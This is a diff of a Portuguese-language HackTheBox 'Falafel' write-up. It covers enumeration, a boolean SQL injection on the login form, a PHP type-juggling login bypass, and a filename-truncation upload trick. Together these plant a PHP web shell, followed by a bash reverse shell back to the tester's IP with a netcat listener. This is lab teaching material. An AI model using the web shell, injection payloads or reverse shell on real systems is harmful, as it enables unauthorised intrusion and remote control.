@@ -143,18 +143,21 @@
 <hr />
 <h1 id="enumeração"><a class="header" href="#enumeração">Enumeração</a></h1>
 <h2 id="nmap"><a class="header" href="#nmap">Nmap</a></h2>
-<p>For enumeration, after verifying the connection, I always do a nmap scan like this:</p>
+<p>Na fase de enumeração, a ferramenta <em>nmap</em> tem um lugar imprescindível!! É possível enumerar portas manualmente, com um simples <em>for loop</em> e um <em>echo para o /dev/tcp/&lt;IP&gt;/&lt;PORT&gt;</em>, mas, para além do nmap ser mais controlável em termo de rendimento, tem também montes de scripts.nse que podem descobrir coisas sobre cada porta aberta.</p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/allPorts.png" alt="allPorts" /></p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/nmap-A.png" alt="nmap-A" /></p>
-<p>We have only ssh and 1 http port. The version of ssh have not big vulnerabilities, so the target is the port 80</p>
+<p>O resultado do nmap indica-nos que estamos que o nosso alvo é uma máquina Linux, com apenas as portas 22 e 80 abertas. As versões dos serviços correndo nessas portas não parecem ter vulnerabilidades críticas, por isso estamos certos que o ponto de entrada é o servidor WEB</p>
 <h2 id="website"><a class="header" href="#website">WebSite</a></h2>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/website-1.png" alt="Website - First page" /></p>
-<p>This site give some information. We have a email (IT@falafel.htb) and with this email, we can suspect potential user (IT) and virtual hosting (falafel.htb). let add this host on /etc/hosts</p>
-<pre><code class="language-bash">echo -e &quot;10.10.10.73\tfalafel.htb&quot; &gt;&gt; /etc/hosts
+<p>Só pela página principal, já obtemos informações potencialmente úteis. Temos um email (IT@falafel.htb) e com isso, podemos suspeitar existir um usuário (IT) e virtual hosting (falafel.htb).</p>
+<pre><code class="language-bash"># Adicionar o host ao /etc/hosts
+echo -e &quot;10.10.10.73\tfalafel.htb&quot; &gt;&gt; /etc/hosts
 </code></pre>
+<p>Apesar de ser uma suspeita plausível, não existe virtual host.</p>
 <h3 id="fuzzing-the-website"><a class="header" href="#fuzzing-the-website">Fuzzing the website</a></h3>
-<p>The first fuzzing i do is for the website</p>
-<pre><code class="language-bash">ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r
+<p>Antes de falar da página do Login (que é por aí que se vai penetrar a máquina!), irei falar sobre as rotas e potenciais ficheiros da máquina.</p>
+<pre><code class="language-bash"># Primeira enumeração básica de rotas
+ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r
 
 #&gt;  assets                  [Status: 403, Size: 293, Words: 22, Lines: 12]
 #&gt;  css                     [Status: 403, Size: 290, Words: 22, Lines: 12]
@@ -164,8 +167,8 @@
 						#&gt;  [Status: 200, Size: 7203, Words: 774, Lines: 110]
 #&gt;  server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
 </code></pre>
-<p>We can see and uploads directory. But nothing more... keep searching...</p>
-<p>The second scan i want to do is for discovery possibles files! We have the information that is an apache with &quot;whatweb http://falafel.htb&quot; and the login button redirect us to a login.php. We can try to find files with php extentions. But we can add txt too</p>
+<p>Vemos um diretório <strong>upload</strong>. Mas por enquanto nada de mais... Temos de procurar mais...</p>
+<p>O segundo scan que quero rodar é por ficheiros. Sabemos que é um servidor apache com auxilio do nmap, por isso podemos supor que o servidor funcione com ficheiros php. Além disso, o botão de login nós redirige para um login.php. Posto isso, o nosso próximo scan vai ser para procurar ficheiros com extenções php. Podemos também procurar por ficheiros txt...</p>
 <pre><code class="language-bash">ffuf -c -u http://10.10.10.73/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 200 -r -e .txt,.php
 
 #&gt;  profile.php             [Status: 200, Size: 7063, Words: 878, Lines: 103]
@@ -189,25 +192,35 @@
 #&gt;  server-status           [Status: 403, Size: 299, Words: 22, Lines: 12]
 
 </code></pre>
-<p>Whats is cyberlaw.txt?!</p>
+<blockquote>
+<p>O que é isso de cyberlaw.txt?!</p>
+</blockquote>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/cyberlaw.png" alt="cyberlaw.txt" /></p>
-<p>That give us a lot of potential information...</p>
+<p>Bem, isto nos trás algumas informações...</p>
 <ul>
-<li>Users devs and lawyers with &quot;To: lawyers@falafel.htb, devs@falafel.htb&quot;</li>
-<li>User &quot;chris&quot; and confirme &quot;admin&quot; user</li>
+<li>Potencial users:
+<ul>
+<li>devs (de devs@falafel.htb)</li>
+<li>lawyers (de lawyers@falafel.htb)</li>
+<li>chris (do próprio texto)</li>
+<li>admin (da &quot;assinatura&quot;)</li>
 </ul>
+</li>
+</ul>
+<p>Ainda nos diz que o usuário chris conseguiu ter FULL CONTROL do site usando um recurso de uploads de imagens, que ainda não descobrimos. Sabemos ainda que o url de upload de imagens está filtrado, por isso não deve ser assim tão fácil... Prossigamos</p>
 <h3 id="sqli"><a class="header" href="#sqli">SQLi</a></h3>
-<p>After opening http://falafel.htb/ from the browser, we have a button login. if with put &quot;admin&quot; &quot;admin&quot; for user and password, we get an error &quot;Wrong identification : admin&quot;. Another random username give us &quot;Try again..&quot;. We can assume that the user &quot;admin&quot; existe.</p>
+<p>Quando abrimos a página http://falafel.htb/ de um browser, vemos então um botão login. Ao por credenciais por defeito do tipo <em>admin:admin, admin:password, test:test...</em>, verificamos que poderá existir um usuário admin, pois temo uma mensagem de erro que diz <strong>&quot;Wrong identification : admin&quot;</strong>. Outros usuários aleatórios nos dá a mensagem <strong>&quot;Try again..&quot;</strong>. Agora, e com a tal mensagem de cyberlaw.txt, podemos assumir que o usuário <strong>&quot;admin&quot;</strong> existe.</p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/admin-login-try.png" alt="admin login try" /></p>
-<p>If we put user &quot;' or 1=1 -- -&quot; and password &quot;' or 1=1 -- -&quot;, we get the same error &quot;Wrong identification : admin&quot;. Maybe it is vulnerable to SQLi.</p>
-<p>If we put user &quot;admin' and sleep(5)&quot; and random password, we got this error &quot;Hacking Attempt Detected!&quot;. After some try, we know what is happening. The website blocks keywords. If username or password contain the words &quot;sleep&quot; or &quot;union&quot;, we got the hacking error.</p>
-<p>We can supose de username and password field exist, and can try this:</p>
+<p>Nos servidores em php, é muito commum controlarem o login e outras coisas com uma base de dados MySQL ou similar. Podemos tentar fazer o login com o clássico <strong>&quot;' or 1=1 -- -&quot;</strong> tanto no campo user como no campo password. Obtemos o mesmo erro <strong>&quot;Wrong identification : admin&quot;</strong>. Isto é um claro sinal que este campo é vulnerável a SQLi (SQL injection).</p>
+<p>Temos mensagens distintas, mas não temos o erro SQL concreto! Por isso não é bem um blind SQLi, mas também não é assim tão claro.</p>
+<p>Ao tentar por <strong>&quot;admin' and sleep(5)&quot;</strong>, temos um erro diferente: <strong>&quot;Hacking Attempt Detected!&quot;</strong>. UHUUU O FBI NOS DETECTOU LOOOL...Bem, isto parece um tipo de filtro a palavar chaves, porque ao escrever apenas e só a palavra <strong>&quot;sleep&quot;</strong> ou <strong>&quot;union&quot;</strong>, optemos o mesmo erro...</p>
+<p>Como não vemos nada, mas sabemos como são de uma maneira geral feitas as bases de dados, podemos tentar descobrir o nome da coluna. Ao escrever <strong>admin' and substring(username,1,1)='a'-- -</strong>, estamos a dizer que, para o usuário <em>admin</em>, queremos saber se na coluna de nome <em>username</em>, a letra positionada na 1ª posição é igual a <em>'a'</em>. E isso já nós sabemos. <strong><em>admin</em></strong> começa pela letra <strong><em>'a'</em></strong>.</p>
 <pre><code class="language-txt">admin' and substring(username,1,1)='a'-- -
 </code></pre>
-<p>That code give us the same result (Wrong identification : admin) but if we change de 'a', we got (Try again..)</p>
+<p>Obtemos a mesma mensagem de erro (Wrong identification : admin), e se pusermos qualquer outra letra, obtemos outro erro (Try again..) por a primeira letra não corresponder. Isso é muito bom sinal...</p>
 <pre><code class="language-txt">admin' and substring(username,2,1)='d'-- -
 </code></pre>
-<p>For de second char, if we put a 'd', we got (Wrong identification : admin) and we got (Try again..) if we put another char. if we change <em>&quot;substring(username,1,1)&quot;</em> for <em>&quot;substring(password,1,1)&quot;</em>, we can enumerate all chars of password field with the same method. So i made a python script for discover the hash password of users &quot;admin&quot; and &quot;chris&quot; (the only 2 know valid username):</p>
+<p>Ao testar para o segundo caractere, obtemos o mesmo resultado, apenas optemos (Wrong identification : admin) quando acertamos na letra <strong><em>'d'</em></strong>. Mas porquê &quot;Wrong identification : admin&quot;? A query no código php deve estar a fazer uma comparação, entre admin e admin, e nós adicionamos 'and substring(username,1,1)='a'. Só passa para a verificação seguinte se o &quot;admin&quot; existir, <strong>e se</strong> &quot;a sua primeira letra for 'a'&quot;. Depois de validar o campo user, fica barrado pela password, pois não a temos... Então, quando acerto na substring, vai me responder &quot;Wrong identification&quot;. Posto isso, podemos enumerar todos os campos de todas as tabelas da base de dados desta forma. O único problema é que não temos ideia do nome dessas tabelas nem das suas colunas... Mas também não persisamos saber tudo! Basta-nos a password! Seguindo o mesmo princípio, podemos tentar com o nome de coluna password (por ser comum e normal de ser chamdo assim): <strong>admin' and substring(password,1,1)='0...1...2...3...até...ao...z'-- -</strong>. Manualmente, iria ser possível, mas apenas com 3 litros de café e pausas de 2 em 2 horas! Vamos automatizar isso em python:</p>
 <pre><code class="language-python">import requests
 import re
 from pwn import log
@@ -249,69 +262,80 @@ def main():
 
 main()
 </code></pre>
-<p>The script give us 2 hashes:</p>
+<p>Este script deu como resultado essas credenciais:</p>
 <ul>
 <li>chris: d4ee02a22fc872e36d9e3751ba72ddc8</li>
 <li>admin: 0e462096931906507119562988736854</li>
 </ul>
-<p>with online tool called crackstation.net, we got 1 password:</p>
+<p>Credenciais, não... São hashes, e provavelmente poderão ser crackeadas online com uma ferramenta de rambow tables crackstation.net:</p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/Crackstation.png" alt="crack station" /></p>
 <blockquote>
-<p>chris:juggling</p>
+<p>Optemos um resultado ==&gt; chris:juggling</p>
 </blockquote>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/login_chris.png" alt="Login Chris" /></p>
-<p>The Chris perfile have a tip. <em>TYPE-JUGGLING</em></p>
-<p>The admin hash is 0e462096931906507119562988736854. in php, the string &quot;0e462096931906507119562988736854&quot; == 0 (or &quot;0&quot; or every md5 hash who as &quot;0e{numbers...}&quot;) cause php interprete that 0e{numbers...} like 0 * (10 ^ {numbers...}) and, if the comparison is done with the loose comparisons &quot;==&quot; instead of the strict comparisons &quot;===&quot;, we can bypass the password with every strings that the hash is 0e{numbers...}. On the internet, we can found a lot of md5 hashes who result in 0e{numbers...}. I will try login with &quot;NWWKITQ&quot;</p>
+<p>Essas credenciais são válidas para a página de login! E ao entrar, deparamos-nos com a página de apredentação do chris, com um TIPS: <em>TYPE-JUGGLING</em></p>
+<p>O hash do usuário &quot;admin&quot; tem uma particularidade. 0e462096931906507119562988736854. Em php, o string &quot;0e462096931906507119562988736854&quot; == 0 ( ou &quot;0&quot; == 0, ou qualquer &quot;0e&lt;numeros...&gt;&quot; == 0) porque php interpreta este 0e&lt;quaiqueres numeros&gt; por <strong>*zero vezes 10 elevado a quaiqueres números</strong> que efectivamente dá zero. Existe ainda em php duas formas de comparar valores.</p>
+<ul>
+<li>== - loose comparisons (compara apenas valores) (&quot;0&quot; == 0.0000 =&gt; true)</li>
+<li>=== - strick comparisons (compara valores, e tipos de valores) (&quot;0&quot; == 0.0000 =&gt; false)</li>
+</ul>
+<p>Se o código php estiver a fazer uma comparação com apenas 2 iguais <strong>&quot;==&quot;</strong>, poderá aceitar toda e qualquer palavra passe cuja a sua MD5 é 0e&lt;numeros...&gt;</p>
+<p>Na internet, podemos encontrar muitas dessas passwords. Irei tentar com &quot;NWWKITQ&quot;</p>
 <blockquote>
-<p>admin:NWWKITQ (Not the real password, just juggling bypass)</p>
+<p>admin:NWWKITQ (Não é a password real, apenas deu por juggling bypass)</p>
 </blockquote>
-<p>I am in!</p>
+<p>Login efectuado com sucesso!</p>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/login_admin.png" alt="logged as admin" /></p>
 <h3 id="rce"><a class="header" href="#rce">RCE</a></h3>
-<p>At this point, we can try to upload a file. The box suggests a png file.</p>
+<p>Encontramos o tal painel de upload que chris mencionou. Neste momento, o objectivo é enviar um reverse shell para a máquina vítima, e tentat aceder via URL para o mesmo ser executado. O primeiro passo é descobrir que tipo de ficheiro aceita. A caixa de upload indica ficheiros.png. Vou partilhar um servidor http com uma imagem.png.</p>
 <pre><code class="language-bash">sudo python3 -m http.server 80
 </code></pre>
-<p>We can update an image with png extention. but the response is very unusual. That's look the website use &quot;wget&quot; binary for download the file. I tried change extension, MIME type, concate a command (because the server use wget) but nothing work... The way to upload is very tricky! In linux, the maximum size of a name file is 255 chars. And wget as a function that cute the name if is very long!!</p>
-<pre><code class="language-bash"># Copy the real image with 251 pattern char and last 4 chars as .png (255 chars)
+<p>Conseguimos realmente enviar uma imagem. E a resposa é muito incomum! A resposta parece-se muito com um commando bash, um cd para uma pasta, e um wget para o nosso ficheiro de imagem. Tentei burlar o site de diversas formas (Dupla extensão, mudar o MIME TYPE, concatenar comando com ponto e virgula, &amp;&amp;, ||... mas nada).</p>
+<p>A forma de enviar um ficheiro malicioso é surpreendente! O Linux não aceita nomes de arquivos que tenha mais do que 255 caracteres. E o wget está feito para limitar isso, para garantir que receba os arquivos da internet, mesmo com nomes ridiculamente enormes... Tentei então enviar um arquivo de imagem com exatamente 255 caracteres (251 + .png).</p>
+<pre><code class="language-bash"># Copia da imagem para um arquivo com nome de 251 caracteres seguindo um padrão para depois poder saber ao certo qual é o ponto exacto onde o wget corta o nome
 cp shell.png $(msf-pattern_create -l 251).png
 </code></pre>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/output_wget.png" alt="Output wget" /></p>
-<p>The Output say literally the last 4 chars of the new name file is h7Ah</p>
+<p>Pela resposta, sabemso que foi enviado com successo, e que o nome foi alterado, tendo como fim o h7Ah.´</p>
 <pre><code class="language-bash">msf-pattern_offset -q h7Ah
 #&gt;  [*] Exact match at offset 232
 </code></pre>
-<p>Create a new file named shell.php:</p>
+<p>Este &quot;Exact match at offset 232&quot; é feito para bufferoverflow, que normalmente seria o ponto que ficaria no ESP, sendo que não é bem esse o ponto certo. O ponto certo é 236 caracteres, mas como ainda temos de adicionar 4 caracteres para o &quot;.png&quot;, até que dá jeito este erro lol.</p>
+<p>Cração de um ficheiro malicioso:</p>
 <pre><code class="language-php">&lt;?php
 	echo &quot;\nURL Shell... url?cmd=&lt;command&gt;\n\n&quot;;
 	echo &quot;&lt;pre&gt;&quot; . shell_exec($_REQUEST['cmd']) . &quot;&lt;/pre&gt;&quot;;
 ?&gt;
 </code></pre>
-<p>We know:</p>
+<p>Resumindo:</p>
 <ul>
-<li>The file need to end with &quot;.png&quot; extension</li>
-<li>The site will interprete php code</li>
-<li>the wget of the server cut name too long and the exact offset was 232 So, we need a file with 228 char + .php + .png (for delete .png too long, and save the file pas .php)</li>
+<li>O ficheiro tem obrigatoriamente que terminar por &quot;.png&quot;</li>
+<li>O servidor apache interpreta código php</li>
+<li>O wget da página de upload corta os nomes muito grandes a partir do caractere 236.</li>
 </ul>
+<p>Posto isso, se renomearmos o nosso ficheiro malicioso por um arquivo com (232 carateres + .php + .png), o nome do arquivo irá ser cortado a partir do 236º caracter e ficará assim: (232 chars + .php)</p>
 <pre><code class="language-bash">cp shell.php $(msf-pattern_create -l 232).php.png
+# Agora que temos o número exato de caracteres, poderíamos ter chamado o ficheiro com 232 &quot;A&quot;... mas na altura não me lembrei e o nome está um pouco agressivo para os olhos!
 </code></pre>
-<p>In upload page, get the file and save the output...</p>
+<p>Resultado:</p>
 <blockquote>
 <p>http://10.10.14.17/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php.png</p>
 </blockquote>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/good_upload.png" alt="uploaded web shell" /></p>
-<p>Note the path of the file and go to the webshell</p>
+<p>Note the path of the file and go to the webshell Ok, conseguimos enviar um arquivo, que aparentemente agora está na máquina alvo com a extensão .php. E onde está? Bem, no resultado o comando wget, vemos que antes de fazer o download do arquivo, fez um cd para uma pasta. E sabemos ainda que existe uma rota uploads... Ao juntar tudo, podemos tentar ir para a seguinte url(no meu caso):</p>
 <blockquote>
 <p>http://10.10.10.73/uploads/0909-2054_bd1a63d419ed6bf6/Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6A.php?cmd=whoami</p>
 </blockquote>
 <p><img src="Assets/HTB-Linux-Hard-Falafel/whoami_web_shell.png" alt="whoami web shell" /></p>
-<p>We Have Remote Code Execution!</p>
+<p>Temos Execução de código remoto!</p>
 <h3 id="reverse-shell"><a class="header" href="#reverse-shell">Reverse Shell</a></h3>
-<p>Create a file names rev.html with the follow content:</p>
+<p>A forma mais fácil de ter um reverse shell sem ter muitos problemas com caracteres especiais e assim é partilhar um ficheiro com o código do reverse shell lá dentro, para depois fazer um curl e pipeá-lo com um bash (sim pipeá-lo, neste blog, este verbo existe xD)</p>
+<p>Criei então um ficheiro com o nome rev.html contendo o seguinte código:</p>
 <pre><code class="language-bash">#!/bin/bash
 
 bash -i &gt;&amp; /dev/tcp/10.10.14.17/443 0&gt;&amp;1
 </code></pre>
-<p>Then, share a http server and with RCE on website, curl him, and execute him</p>
+<p>Partilhe então um servidor http com este ficheiro, afim de através do RCE, dar um curl ao ficheiro, e pipeá-lo com bash</p>
 <pre><code class="language-bash">sudo python3 -m http.server 80  # On one terminal
 sudo nc -lvnp 443               # On another one
 </code></pre>
